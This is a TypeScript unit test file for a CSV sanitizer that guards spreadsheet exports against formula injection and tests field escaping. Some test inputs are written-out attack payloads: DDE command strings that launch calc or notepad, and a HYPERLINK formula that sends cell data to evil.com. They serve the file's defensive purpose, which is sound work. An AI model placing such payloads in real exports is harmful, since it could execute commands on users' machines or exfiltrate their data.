import {
    sanitizeCsvValue,
    escapeCsvField,
    sanitizeAndEscapeCsvField,
} from './csv-sanitizer';

describe('CSV Sanitizer', () => {
    describe('sanitizeCsvValue', () => {
        it('should return empty string for null', () => {
            expect(sanitizeCsvValue(null)).toBe('');
        });

        it('should return empty string for undefined', () => {
            expect(sanitizeCsvValue(undefined)).toBe('');
        });

        it('should return empty string for empty string', () => {
            expect(sanitizeCsvValue('')).toBe('');
        });

        it('should return normal values unchanged', () => {
            expect(sanitizeCsvValue('Hello World')).toBe('Hello World');
            expect(sanitizeCsvValue('123')).toBe('123');
            expect(sanitizeCsvValue('user@example.com')).toBe(
                'user@example.com',
            );
        });

        describe('formula injection prevention', () => {
            it('should prefix values starting with = with single quote', () => {
                expect(sanitizeCsvValue('=1+1')).toBe("'=1+1");
                expect(sanitizeCsvValue("=CMD|'/C calc'!A0")).toBe(
                    "'=CMD|'/C calc'!A0",
                );
                expect(sanitizeCsvValue('=HYPERLINK("http://evil.com")')).toBe(
                    '\'=HYPERLINK("http://evil.com")',
                );
            });

            it('should prefix values starting with + with single quote', () => {
                expect(sanitizeCsvValue('+1')).toBe("'+1");
                expect(sanitizeCsvValue("+cmd|'/C notepad'!A0")).toBe(
                    "'+cmd|'/C notepad'!A0",
                );
            });

            it('should prefix values starting with - with single quote', () => {
                expect(sanitizeCsvValue('-1')).toBe("'-1");
                expect(sanitizeCsvValue('-100')).toBe("'-100");
            });

            it('should prefix values starting with @ with single quote', () => {
                expect(sanitizeCsvValue('@SUM(A1:A10)')).toBe("'@SUM(A1:A10)");
            });

            it('should prefix values starting with tab with single quote', () => {
                expect(sanitizeCsvValue('\tmalicious')).toBe("'\tmalicious");
            });

            it('should prefix values starting with carriage return with single quote', () => {
                expect(sanitizeCsvValue('\rmalicious')).toBe("'\rmalicious");
            });
        });

        it('should not modify values with trigger chars in middle', () => {
            expect(sanitizeCsvValue('hello=world')).toBe('hello=world');
            expect(sanitizeCsvValue('a+b')).toBe('a+b');
            expect(sanitizeCsvValue('a-b')).toBe('a-b');
            expect(sanitizeCsvValue('test@example.com')).toBe(
                'test@example.com',
            );
        });
    });

    describe('escapeCsvField', () => {
        it('should return normal values unchanged', () => {
            expect(escapeCsvField('Hello')).toBe('Hello');
            expect(escapeCsvField('123')).toBe('123');
        });

        it('should wrap values containing commas in quotes', () => {
            expect(escapeCsvField('Hello, World')).toBe('"Hello, World"');
        });

        it('should wrap values containing quotes and escape them', () => {
            expect(escapeCsvField('He said "Hello"')).toBe(
                '"He said ""Hello"""',
            );
        });

        it('should wrap values containing newlines in quotes', () => {
            expect(escapeCsvField('Line1\nLine2')).toBe('"Line1\nLine2"');
        });

        it('should handle multiple special characters', () => {
            expect(escapeCsvField('Hello, "World"\nTest')).toBe(
                '"Hello, ""World""\nTest"',
            );
        });
    });

    describe('sanitizeAndEscapeCsvField', () => {
        it('should sanitize and escape values', () => {
            expect(sanitizeAndEscapeCsvField('Hello')).toBe('Hello');
            expect(sanitizeAndEscapeCsvField(null)).toBe('');
            expect(sanitizeAndEscapeCsvField(undefined)).toBe('');
        });

        it('should sanitize formula injection and then escape', () => {
            expect(sanitizeAndEscapeCsvField('=1+1')).toBe("'=1+1");
        });

        it('should handle values needing both sanitization and escaping', () => {
            expect(sanitizeAndEscapeCsvField('=Hello, World')).toBe(
                '"\'=Hello, World"',
            );
        });

        it('should handle real-world malicious payloads', () => {
            // DDE attack payload - sanitized with ' prefix
            const ddePayload = "=cmd|'/C calc'!A0";
            expect(sanitizeAndEscapeCsvField(ddePayload)).toBe(
                "'=cmd|'/C calc'!A0",
            );

            // Hyperlink exfiltration - sanitized and escaped (contains quotes)
            const hyperlinkPayload = '=HYPERLINK("http://evil.com?data="&A1)';
            expect(sanitizeAndEscapeCsvField(hyperlinkPayload)).toBe(
                '"\'=HYPERLINK(""http://evil.com?data=""&A1)"',
            );

            // Payload with comma - needs both sanitize and escape
            const commaPayload = '=SUM(A1,A2)';
            expect(sanitizeAndEscapeCsvField(commaPayload)).toBe(
                '"\'=SUM(A1,A2)"',
            );
        });
    });
});
